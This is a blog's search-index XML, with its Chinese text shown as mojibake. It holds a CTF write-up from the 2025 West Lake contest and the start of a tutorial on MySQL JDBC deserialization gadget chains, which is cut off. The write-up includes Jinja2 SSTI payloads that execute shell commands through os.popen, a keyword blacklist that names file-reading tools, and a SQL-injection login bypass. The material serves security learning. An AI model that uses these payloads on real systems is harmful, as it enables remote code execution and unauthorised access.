<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2025è¥¿æ¹–è®ºå‰‘Wp</title>
      <link href="/2025/01/19/CTF/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/"/>
      <url>/2025/01/19/CTF/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Rank-l"><a href="#Rank-l" class="headerlink" title="Rank-l"></a>Rank-l</h3><p>è¿™é¢˜ä¸€å¼€å§‹çœ‹æ²¡ä»€ä¹ˆæ€è·¯ï¼Œåæ¥é€šè¿‡çœ‹å“åº”åŒ…å‘ç°æ˜¯pythonæœåŠ¡å™¨æ‰€ä»¥æƒ³åˆ°å¯èƒ½æ˜¯sstiæ‰€ä»¥å°±å»è¯•äº†è¯•ï¼Œå‘ç°åœ¨loginè·¯ç”±è¾“å…¥payloadä¼šåœ¨cpassè·¯ç”±ä¸­æ¸²æŸ“ã€‚çœ‹çœ‹æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>Â flaskÂ <span class="keyword">import</span>Â Flask, request, render_template, render_template_string, redirect, url_for, abort  </span><br><span class="line"><span class="keyword">from</span>Â urllib.parseÂ <span class="keyword">import</span>Â unquote  </span><br><span class="line">  </span><br><span class="line">app = Flask(__name__)  </span><br><span class="line">  </span><br><span class="line">phone =Â <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span>Â <span class="title function_">is_safe_input</span>(<span class="params">user_input</span>):  </span><br><span class="line">Â  Â Â <span class="comment"># unsafe_keywords = [&#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;os&#x27;, &#x27;system&#x27;, &#x27;import&#x27;, &#x27;__import__&#x27;]  </span></span><br><span class="line">Â  Â  unsafe_keywords = [<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;less&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;od&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>,<span class="string">&#x27;awd&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;64&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;%2f&#x27;</span>,<span class="string">&#x27;%2F&#x27;</span>]  </span><br><span class="line">Â  Â Â <span class="keyword">if</span>Â <span class="built_in">any</span>(keywordÂ <span class="keyword">in</span>Â user_inputÂ <span class="keyword">for</span>Â keywordÂ <span class="keyword">in</span>Â unsafe_keywords):  </span><br><span class="line">Â  Â Â <span class="comment"># if user_input in unsafe_keywords:  </span></span><br><span class="line">Â  Â  Â  Â Â <span class="keyword">return</span>Â <span class="literal">True</span>  </span><br><span class="line">Â  Â Â <span class="keyword">return</span>Â <span class="literal">False</span>  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span>Â <span class="title function_">index</span>():  </span><br><span class="line">Â  Â Â <span class="keyword">return</span>Â render_template(<span class="string">&quot;index.html&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span>Â <span class="title function_">login</span>():  </span><br><span class="line">Â  Â Â <span class="keyword">global</span>Â phone  </span><br><span class="line">Â  Â  phone = request.form.get(<span class="string">&quot;phone_number&quot;</span>)  </span><br><span class="line">Â  Â Â <span class="keyword">return</span>Â render_template(<span class="string">&quot;login.html&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/cpass&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span>Â <span class="title function_">check</span>():  </span><br><span class="line">Â  Â Â <span class="keyword">global</span>Â phone  </span><br><span class="line">Â  Â  password = request.form.get(<span class="string">&quot;password&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">Â  Â Â <span class="keyword">if</span>Â is_safe_input(phone):  </span><br><span class="line">Â  Â  Â  Â Â <span class="keyword">return</span>Â redirect(url_for(<span class="string">&#x27;index&#x27;</span>))  </span><br><span class="line">  </span><br><span class="line">Â  Â Â <span class="keyword">if</span>Â phone !=Â <span class="string">&quot;1686682318&quot;</span>Â <span class="keyword">and</span>Â password !=Â <span class="string">&quot;Happy_news_admin&quot;</span>:  </span><br><span class="line">Â  Â  Â  Â Â <span class="keyword">return</span>Â render_template_string(<span class="string">&#x27;&lt;!DOCTYPE html&gt;\  </span></span><br><span class="line"><span class="string">Â  Â  Â  Â  &lt;html lang=&quot;en&quot;&gt;\  </span></span><br><span class="line"><span class="string">Â  Â  Â  Â  &lt;head&gt;\  </span></span><br><span class="line"><span class="string">Â  Â  Â  Â  Â  Â  &lt;meta charset=&quot;UTF-8&quot;&gt;\  </span></span><br><span class="line"><span class="string">Â  Â  Â  Â  Â  Â  &lt;title&gt;login failed&lt;/title&gt;\  </span></span><br><span class="line"><span class="string">Â  Â  Â  Â  &lt;/head&gt;\  </span></span><br><span class="line"><span class="string">Â  Â  Â  Â  &lt;body&gt;\  </span></span><br><span class="line"><span class="string">Â  Â  Â  Â  Â  Â  &lt;script&gt;alert(&quot;&#123;&#125;The number does not exist or the password is incorrect!&quot;) &lt;/script&gt;\  </span></span><br><span class="line"><span class="string">Â  Â  Â  Â  Â  Â  &lt;script&gt;window.location.href = &quot;/&quot;;&lt;/script&gt;\  </span></span><br><span class="line"><span class="string">Â  Â  Â  Â  &lt;/body&gt;\  </span></span><br><span class="line"><span class="string">Â  Â  Â  Â  &lt;/html&gt;&#x27;</span>.<span class="built_in">format</span>(phone))  </span><br><span class="line">Â  Â Â <span class="keyword">else</span>:  </span><br><span class="line">Â  Â  Â  Â Â <span class="keyword">return</span>Â redirect(url_for(<span class="string">&#x27;index&#x27;</span>))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>Â __name__ ==Â <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">Â  Â  app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="built_in">int</span>(<span class="string">&quot;5005&quot;</span>), debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>ä»æºç ä¸­ä¹Ÿèƒ½çœ‹å‡ºæ¥æ˜¯åœ¨cpassä¸­æ¸²æŸ“çš„ï¼Œæ‰€ä»¥è¿™é‡Œå°±åªéœ€è¦ç»•è¿‡é»‘åå•å°±å¯ä»¥äº†</p><p>ç›´æ¥ä¸Špayload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span> cycler.<span class="built_in">next</span>.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cd ..;ls&#x27;</span>).read()%&#125;</span><br><span class="line"></span><br><span class="line">&#123;%<span class="built_in">print</span> cycler.<span class="built_in">next</span>.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;CD ..;NL FLAGF149&#x27;</span>.lower()).read()%&#125;<span class="string">&quot;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="sqli-or-not"><a href="#sqli-or-not" class="headerlink" title="sqli or not"></a>sqli or not</h3><p>å…ˆçœ‹æºç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">varÂ express =Â require(&#x27;express&#x27;);  </span><br><span class="line">varÂ router = express.Router();  </span><br><span class="line">module.exports = router;  </span><br><span class="line">  </span><br><span class="line">router.get(&#x27;/&#x27;,(req,res,next)=&gt;&#123;  </span><br><span class="line">Â  Â Â if(req.query.info)&#123;  </span><br><span class="line">Â  Â  Â  Â Â if(req.url.match(/\,/ig))&#123;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  res.end(&#x27;hacker1!&#x27;);  </span><br><span class="line">Â  Â  Â  Â  &#125;  </span><br><span class="line">Â  Â  Â  Â Â varÂ info =Â JSON.parse(req.query.info);  </span><br><span class="line">Â  Â  Â  Â Â if(info.username&amp;&amp;info.password)&#123;  </span><br><span class="line">Â  Â  Â  Â  Â  Â Â varÂ username = info.username;  </span><br><span class="line">Â  Â  Â  Â  Â  Â Â varÂ password = info.password;  </span><br><span class="line">Â  Â  Â  Â  Â  Â Â if(info.username.match(/\&#x27;|\&quot;|\\/) || info.password.match(/\&#x27;|\&quot;|\\/))&#123;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  res.end(&#x27;hacker2!&#x27;);  </span><br><span class="line">Â  Â  Â  Â  Â  Â  &#125;  </span><br><span class="line">Â  Â  Â  Â  Â  Â Â varÂ sql =Â &quot;select * from userinfo where username = &#x27;&#123;username&#125;&#x27; and password = &#x27;&#123;password&#125;&#x27;&quot;;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  sql = sql.replace(&quot;&#123;username&#125;&quot;,username);  </span><br><span class="line">Â  Â  Â  Â  Â  Â  sql = sql.replace(&quot;&#123;password&#125;&quot;,password);  </span><br><span class="line">Â  Â  Â  Â  Â  Â  connection.query(sql,functionÂ (err,rs)Â &#123;  </span><br><span class="line">Â  Â  Â  Â  Â  Â Â ifÂ (err) &#123;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  res.end(&#x27;error1&#x27;);  </span><br><span class="line">Â  Â  Â  Â  Â  Â  &#125;  </span><br><span class="line">Â  Â  Â  Â  Â  Â Â elseÂ &#123;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â Â if(rs.length&gt;0)&#123;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  res.sendFile(&#x27;/flag&#x27;);  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  &#125;elseÂ &#123;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  res.end(&#x27;username or password error&#x27;);  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  &#125;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  &#125;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  &#125;)  </span><br><span class="line">Â  Â  Â  Â  &#125;  </span><br><span class="line">Â  Â  Â  Â Â else&#123;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  res.end(&quot;please input the data&quot;);  </span><br><span class="line">Â  Â  Â  Â  &#125;  </span><br><span class="line">Â &#125;else&#123;  </span><br><span class="line">Â  Â  Â  Â  res.end(&quot;please input the data&quot;);  </span><br><span class="line">Â  Â  &#125;  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>è¿™é¢˜å…¶å®åˆšå¼€å§‹çœ‹çš„æ—¶å€™ä»¥ä¸ºæ˜¯è€ƒç‚¹æ˜¯sqlæ³¨å…¥ä½†æ˜¯å‘ç°è¿‡æ»¤äº† \ â€œ â€˜ ,ç­‰å¯¼è‡´æ‰¾äº†å¾ˆå¤šèµ„æ–™ä¹Ÿä¸çŸ¥é“æ€ä¹ˆç»•ï¼Œç»“æŸä¹‹åæ‰å‘ç°è€ƒç‚¹å…¶å®åœ¨replaceè¿™ä¸ªå‡½æ•°ä¸Šï¼Œå¯ä»¥å‚è€ƒï¼š<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/lastMatch">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/lastMatch</a></p><p>ä¸»è¦åˆ©ç”¨çš„æ˜¯</p><img src="/2025/01/19/CTF/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119125214353.png" class=""><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„ <font>$&#96;</font> ç›´æ¥çœ‹è§£é‡Šå¯èƒ½æœ‰ç‚¹æŠ½è±¡çœ‹ä¸€ä¸‹è°ƒè¯•å°±æ˜ç™½äº†</p><img src="/2025/01/19/CTF/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119131022981.png" class=""><p>å¯ä»¥çœ‹åˆ°å·²ç»é—­åˆäº†å‰é¢çš„â€™æ‰€ä»¥å°±å¯ä»¥ç›´æ¥æ„é€ sqlä¸‡èƒ½ç»•è¿‡äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;$` or 1--+&quot;%2c&quot;password&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ç³Ÿç³•çš„ç£ç›˜"><a href="#ç³Ÿç³•çš„ç£ç›˜" class="headerlink" title="ç³Ÿç³•çš„ç£ç›˜"></a>ç³Ÿç³•çš„ç£ç›˜</h3><p>è¿™é¢˜å…¶å®ç”¨å–è¯å¤§å¸ˆå¯ä»¥ç›´æ¥æ¢­å“ˆå‡ºæ¥key.png å’Œ ä¸€ä¸ªsecretç„¶åç”¨Veracryptè§£å¯†å³å¯ã€‚è¿™é‡Œè¿˜å­¦åˆ°äº†ä¸€ä¸ªæ–°çš„å·¥å…·</p><img src="/2025/01/19/CTF/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119131358031.png" class=""><p>è¿™ä¸ªä¹Ÿå¯ä»¥ç›´æ¥æ‰«æå‡ºæ¥è¿›è¡Œç£ç›˜å–è¯ã€‚</p><h2 id="ds"><a href="#ds" class="headerlink" title="ds"></a>ds</h2><h3 id="easydatalog"><a href="#easydatalog" class="headerlink" title="easydatalog"></a>easydatalog</h3><p>è¿™é¢˜çš„è¯å°±æ˜¯æ—¥å¿—åˆ†æå¥—äº†ä¸€å±‚å›¾ç‰‡éšå†™ï¼Œå…ˆåˆ†ææ—¥å¿—</p><img src="/2025/01/19/CTF/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119131614809.png" class=""><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯jpgå›¾ç‰‡ï¼Œç„¶åé€šè¿‡å¯¹å‰é¢çš„ğŸœå‰‘æ•°æ®è§£å¯†å¾—åˆ°æ˜¯ä¸€ä¸ªpassword.jpgæ‰€ä»¥å¯¹å…¶è¿›è¡Œå•å›¾å¿™æ°´å°å³å¯å¾—åˆ°ä¸€ä¸ªå¯†ç </p><img src="/2025/01/19/CTF/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119131903502.png" class=""><p>åœ¨ä¸‹é¢è¿˜æœ‰ä¸€ä¸ªå‹ç¼©åŒ…</p><img src="/2025/01/19/CTF/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119131739135.png" class=""><p>å°†ä¸Šå›¾çš„å¯†ç è§£å‹å¯å¾—åˆ°csvæ–‡ä»¶ç›´æ¥æœç´¢å¼ ä¸‰å³å¯è·å–å…¶èº«ä»½è¯å’Œæ‰‹æœºå·ã€‚</p><h3 id="å–è¯"><a href="#å–è¯" class="headerlink" title="å–è¯"></a>å–è¯</h3><p>è¿™é¢˜æ²¡æ—¶é—´åšäº†ä½†æ˜¯è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œå¯ä»¥ç›´æ¥ç”¨lovelymemé›†æˆçš„volå·¥å…·è¿›è¡Œå†…å­˜åˆ†æ</p><p>ç›´æ¥çœ‹æ§åˆ¶å°è¾“å‡º</p><img src="/2025/01/19/CTF/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119132349042.png" class=""><p>å¾ˆå®¹æ˜“èƒ½å¤Ÿæƒ³åˆ°å»æŠŠè¿™å‡ ä¸ªæ–‡ä»¶å¯¼å‡ºæ¥è¿›è¡Œè§£å¯†è¿˜åŸ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">hackkey = os.getenv(<span class="string">&#x27;hackkey&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> hackkey:</span><br><span class="line"></span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;Environment variable &#x27;hackkey&#x27; is not set&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;private.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">private_key = RSA.import_key(f.read())</span><br><span class="line"></span><br><span class="line">public_key = private_key.publickey().export_key()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">aes_key = hashlib.sha256(hackkey.encode()).digest()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.csv&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">data = f.read()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">cipher_aes = AES.new(aes_key, AES.MODE_EAX)</span><br><span class="line"></span><br><span class="line">ciphertext, tag = cipher_aes.encrypt_and_digest(data)</span><br><span class="line"></span><br><span class="line">cipher_rsa = PKCS1_OAEP.new(RSA.import_key(public_key))</span><br><span class="line"></span><br><span class="line">enc_aes_key = cipher_rsa.encrypt(aes_key)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;encrypted_data.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">f.write(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc_aes_key.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cipher_aes.nonce.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(tag.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯åŠ å¯†çš„è„šæœ¬é€†å‘è¿˜åŸå°±è¡Œï¼Œè¿™é‡Œç”¨åˆ°çš„keyå»æ‰¾ç¯å¢ƒå˜é‡</p><img src="/2025/01/19/CTF/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119133056348.png" class=""><p>æ‰¾åˆ°keyä¹‹åè¿˜æœ‰æ§åˆ¶å°çš„è¾“å‡ºç›´æ¥å¯ä»¥å†™è§£å¯†è„šæœ¬ã€‚ç„¶ååœ¨åé¢çš„è§£å¯†å‡ºæ¥çš„csvä¸­çš„ä¸ªæ€§ç­¾åæ˜¯rc4åŠ å¯†å¯†é’¥å°±æ˜¯å¯†ç ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFWP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JDBCååºåˆ—åŒ–</title>
      <link href="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h2><ul><li>Jdbcå¯æ§ä¸”ç›®æ ‡æœºå™¨å‡ºç½‘ã€‚</li><li>å­˜åœ¨ååºåˆ—åŒ–åˆ©ç”¨é“¾çš„æ¼æ´ç»„ä»¶ä¾‹å¦‚ccé“¾é‚£äº›ã€‚</li></ul><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><ul><li>BLOBä¸ºäºŒè¿›åˆ¶å½¢å¼çš„é•¿æ–‡æœ¬æ•°æ®</li><li>BITç±»å‹(Bitæ•°æ®ç±»å‹ç”¨æ¥å­˜å‚¨bitå€¼)æ•°æ®</li><li>queryInterceptors:ä¸€ä¸ªé€—å·åˆ†å‰²çš„Classåˆ—è¡¨ï¼ˆå®ç°äº†com.mysql.cj.interceptors.QueryInterceptoræ¥å£çš„Classï¼‰ï¼Œåœ¨Queryâ€ä¹‹é—´â€è¿›è¡Œæ‰§è¡Œæ¥å½±å“ç»“æœã€‚ï¼ˆæ•ˆæœä¸Šæ¥çœ‹æ˜¯åœ¨Queryæ‰§è¡Œå‰åå„æ’å…¥ä¸€æ¬¡æ“ä½œï¼‰</li><li>autoDeserialize:è‡ªåŠ¨æ£€æµ‹ä¸ååºåˆ—åŒ–å­˜åœ¨BLOBå­—æ®µä¸­çš„å¯¹è±¡</li></ul><p>è¿™é‡Œå…¶å®æœ€ä¸»è¦çš„ç‚¹æ˜¯åœ¨ä¸è¿™ä¸ªqueryInterceptorså‚æ•°ï¼Œå¼•ç”¨å…¶ä»–å¸ˆå‚…çš„è§£é‡Šï¼š</p><blockquote><p>å®ƒå…è®¸ä½ æŒ‡å®šä¸€ä¸ªæˆ–å¤šä¸ªå®ç°äº†Â <code>com.mysql.cj.interceptors.QueryInterceptor</code>â€‹ æ¥å£çš„ç±»ã€‚è¿™äº›ç±»çš„ç›®çš„æ˜¯åœ¨æ‰§è¡Œ SQL æŸ¥è¯¢å‰åè¿›è¡Œæ‹¦æˆªå’Œæ“çºµï¼Œä½ å®Œå…¨å¯ä»¥ç†è§£ä¸ºï¼Œåªè¦JDBCå¸¦ä¸Šäº†è¿™ä¸ªï¼Œåœ¨æ‰§è¡ŒSQLè¯­å¥å‰ å’Œ å ä»–å°±ä¼šæœ‰ä¸€å±‚ç±»ä¼¼çš„<code>Filter</code>â€‹ï¼Œé»˜è®¤è°ƒç”¨å…¶ é¢„å¤„ç†<code>preProcess</code>â€‹ å’Œåå¤„ç†<code>postProcess</code>â€‹ç­‰æ–¹æ³•ï¼ï¼ï¼</p></blockquote><h2 id="ServerStatusDiffInterceptoré“¾"><a href="#ServerStatusDiffInterceptoré“¾" class="headerlink" title="ServerStatusDiffInterceptoré“¾"></a>ServerStatusDiffInterceptoré“¾</h2><h3 id="8-0-7-8-0-20"><a href="#8-0-7-8-0-20" class="headerlink" title="8.0.7-8.0.20"></a>8.0.7-8.0.20</h3><p>ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="è°ƒç”¨é“¾åˆ†æ"><a href="#è°ƒç”¨é“¾åˆ†æ" class="headerlink" title="è°ƒç”¨é“¾åˆ†æ"></a>è°ƒç”¨é“¾åˆ†æ</h2><p>å…ˆæ¥æ‰¾åˆ°è°ƒç”¨readObjectçš„åœ°æ–¹ï¼Œæ¯•ç«Ÿè¿™é‡Œæ˜¯ååºåˆ—åŒ–çš„æ‰§è¡Œç‚¹ã€‚</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108124312056.png" class=""><p>æ‰¾åˆ°äº†<code>com.mysql.cj.jdbc.result.ResultSetImpl</code> è¿™ä¸ªç±»çš„<code>getobject</code> æ–¹æ³•å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†readObjectæ–¹æ³•ï¼Œæ¥ç€å»å¯»æ‰¾å“ªé‡Œè°ƒç”¨äº†getobjectæ–¹æ³•</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108124735168.png" class=""><p>æ‰¾åˆ°äº† <code>com.mysql.cj.jdbc.util.ResultSetUtil</code>ç±»çš„<code>resultSetToMap()</code>â€‹æ–¹æ³•,åœ¨ç»§ç»­å¯»æ‰¾è°ƒç”¨resultSetToMapæ–¹æ³•çš„åœ°æ–¹</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108124947571.png" class=""><p>æ‰¾åˆ°<code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</code>ç±»çš„<code>populateMapWithSessionStatusValues()</code>â€‹ æ–¹æ³•ï¼Œè¿˜è¦ç»§ç»­å¯»æ‰¾è°è°ƒç”¨äº†å®ƒ</p><img 